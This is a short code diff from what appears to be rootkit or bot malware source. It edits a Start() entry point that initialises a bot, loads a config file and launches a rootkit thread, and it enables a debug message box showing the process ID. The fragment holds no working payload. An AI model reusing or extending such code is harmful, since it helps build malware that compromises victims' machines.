@@ -189,19 +189,19 @@ extern"C"  void WINAPI Start()
 {
 	BOT::Initialize();
 	string Msg;
-	Msg.Format("Присоедините среду к процессу %s", Bot->ApplicationName().t_str()); 
+	Msg.Format("Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
 
 
-	//MessageBoxA(NULL, Msg.t_str(), NULL, 0);
+	MessageBoxA(NULL, Msg.t_str(), NULL, 0); 
 	
 //	string DLLPath(MAX_PATH);
 //	HMODULE Module = LoadLibraryA("kernel32.dll");
-//	GetModuleFileNameA(Module, DLLPath.t_str(), MAX_PATH);
+//	GetModuleFileNameA(Module, DLLPath.t_str(), MAX_PATH); 
 //	MessageBoxA(NULL, DLLPath.t_str(), NULL, 0);
 	 
-	Config::SetFileName("c:\\config\\config.bin");
-	
-	RootkitThread(NULL);
+	Config::SetFileName("c:\\config\\config.bin"); 
+	    
+	RootkitThread(NULL); 
 
 	while (1) pSleep(100000); 
 }
